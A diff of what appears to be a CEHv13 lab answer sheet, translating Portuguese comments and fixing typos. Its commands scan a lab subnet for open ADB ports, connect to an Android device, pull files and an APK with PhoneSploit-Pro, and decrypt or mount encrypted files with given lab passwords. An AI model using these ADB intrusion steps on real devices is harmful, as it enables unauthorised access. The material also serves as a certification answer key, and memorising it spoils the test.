@@ -6,21 +6,21 @@
 
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
-nmap -p 5555 192.168.10.0/24 --open 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
+nmap -p 5555 192.168.10.0/24 --open 192.168.10.101 192.168.10.111 192.168.10.121 192.168.10.144 192.168.10.222
 #### /sdcard/Download/BCtetx.txt
 adb connect 192.168.10.121
 adb pull /sdcard/Download/BCtetx.txt
 python3 -m http.server 8000
 
-#### GOOGLE-CHROME - WORKSATION-1: 172.25.0.10:8080/BCtetx.txt # Selecionar toda chave 
+#### GOOGLE-CHROME - WORKSATION-1: 172.25.0.10:8080/BCtetx.txt # ⚠️ WARNING: Select all keys
 cd 'C:\Users\Admin\Downloads'
-curl "http://172.25.0.10:8000/BCtetx.txt" -o "BCtext.txt" 
+curl "http://172.25.0.10:8000/BCtetx.txt" -o "BCtetx.txt" 
 #### EH Workstation-1: C:\Users\Admin\Documents\pawned.txt
-#### EH Workstation-1: C:\Users\Admin\Downloads\BCtext.txt
-#### E:\CEH-Tools\CEHv13 Module 20 Cryptography\Cryptography Tools\BCTextEncoder\BCTextEncoder.exe # Abrir Tornado com essa ferramenta
-### File → Open → C:\Users\Admin\Documents\pawned.txt # Arquivo que contém senha
+#### EH Workstation-1: C:\Users\Admin\Downloads\BCtetx.txt
+#### E:\CEH-Tools\CEHv13 Module 20 Cryptography\Cryptography Tools\BCTextEncoder\BCTextEncoder.exe # ⚠️ WARNING: Open Tornado with this tool
+### File → Open → C:\Users\Admin\Documents\pawned.txt # ⚠️ WARNING: File containing password
 ### INFO: Pa$$w0rd
-### File → Open → C:\Users\Admin\Downloads\BCtext.txt → Password: Pa$$w0rd → OK # Arquivo que contém hash
+### File → Open → C:\Users\Admin\Downloads\BCtetx.txt → Password: Pa$$w0rd → OK # ⚠️ WARNING: File containing hash
 ### INFO: (ryptD3(0d3
 
 
@@ -47,7 +47,7 @@ curl "http://172.25.0.10:8000/BCtetx.txt" -o "BCtext.txt"
 #### ~/PhoneSploit-Pro/phonesploitpro.py
 sudo su
 ### PASSWORD: toor
-python ~/PhoneSploit-Pro/phonesploitpro.pyPo
+python ~/PhoneSploit-Pro/phonesploitpro.py
 ### [Y] Yes → [1] Connect a Device Install an APK → [192.168.10.121] → [N] Next Page → [N] Next Page → [36] Use Keycodes (Control Device) → [1] Select from App List → [2] com.cxinvetor.file.explorer → [Enter] → [0] Exit
 ### INFO: Saving APK file to PhoneSploit-Pro/Downloaded-Files
 ### INFO: Extracting APK... /data/app/com/cxinvector.file.explorer-gXzSE009r9D...d, 0 skipped. 33.7 MB/s (6368578 bytes in 0.180s)
@@ -72,7 +72,7 @@ crc32 ~/PhoneSploit-Pro/Downloaded-Files/com_cxinvector_file_explorer.apk
 
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
-#### EH Workstation-1: C:\Users\Admin\Documents\signature.zip # Descompactar arquivo
+#### EH Workstation-1: C:\Users\Admin\Documents\signature.zip # 🛑 TODO: Unzip file
 ### Extract All... → C:\Users\Admin\Documents\signature → Extract 
 cd C:\Users\Admin\Documents\signature\signature krish
 Get-FileHash -Algorithm MD5 *
@@ -201,11 +201,11 @@ python3 -m http.server 8000
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
 #### EH Workstation-1: C:\Users\Admin\Documents\MyVeraCrypt
-#### ⚙️JÁ INSTALADO⚙️ E:\CEH-Tools\CEHv13 Module 20 Cryptography\Disk Encryption Tools\VeraCrypt\VeraCrypt Setup 1.26.7.exe # Abrir Logfile.PML com essa ferramenta
+#### ⚙️ALREADY INSTALLED⚙️ E:\CEH-Tools\CEHv13 Module 20 Cryptography\Disk Encryption Tools\VeraCrypt\VeraCrypt Setup 1.26.7.exe # ⚠️ WARNING: Open MyVeraCrypt with this tool.
 ### PATH: VeraCrypt → A: → Select File... → C:\Users\Admin\Documents\MyVeraCrypt → Mount → Pasword: veratest → OK
 ### PASSWORD: veratest
 ### PATH: A:\s2 
-### INFO: daemcrossover.exe  dexterroll.exe  hell.exe  schedupdate.exe # Total de 4 arquivos
+### INFO: daemcrossover.exe  dexterroll.exe  hell.exe  schedupdate.exe # ⚠️ WARNING: Total of 4 files
 
 
 
@@ -321,11 +321,11 @@ cat 2024-09-11_11-52-05.png
 # *** 🏃 ENOUGH COMMANDS FOR RESOLUTION 🏃 ***
 
 #### ~/Documents/Archive/*
-#### ~/Documents/FileHashes.png
+#### ~/Documents/FileHashes.txt
 cd ~/Documents/Archive
 md5sum * 
 ### INFO: 659ae0e46907aaef274fc563e64684bc Quotes.txt
-cat ~/Documents/FileHashes.png
+cat ~/Documents/FileHashes.txt
 ### INFO: Quotes: F1A490C46E1B4C49E006DCA625621A24
 
 
@@ -342,13 +342,13 @@ cat ~/Documents/FileHashes.png
 cd ~/Documents
 python3 -m http.server 8000
 
-#### GOOGLE-CHROME - WORKSATION-1: 172.25.0.10:8000 # Baixar secret
+#### GOOGLE-CHROME - WORKSATION-1: 172.25.0.10:8000 # ⚠️ WARNING: Download secret
 #### EH Workstation-1: C:\Users\Admin\Downloads\secret
-#### ⚙️JÁ INSTALADO⚙️ E:\CEH-Tools\CEHv13 Module 20 Cryptography\Disk Encryption Tools\VeraCrypt\VeraCrypt Setup 1.26.7.exe # Abrir Logfile.PML com essa ferramenta
+#### ⚙️ALREADY INSTALLED⚙️ E:\CEH-Tools\CEHv13 Module 20 Cryptography\Disk Encryption Tools\VeraCrypt\VeraCrypt Setup 1.26.7.exe # ⚠️ WARNING: Open secrets with this tool.
 ### PATH: VeraCrypt → B: → Select File... → C:\Users\Admin\Downloads\secret → Mount → Pasword: test → OK
 ### PASSWORD: test
 ### PATH: B:\ 
-### INFO: Secret1.txt Secret2.txt Secret3.txt Secret4.txt Secret5.txt Secret6.txt # Total de 6 arquivos
+### INFO: Secret1.txt Secret2.txt Secret3.txt Secret4.txt Secret5.txt Secret6.txt # ⚠️ WARNING: Total of 6 files
 
 
 
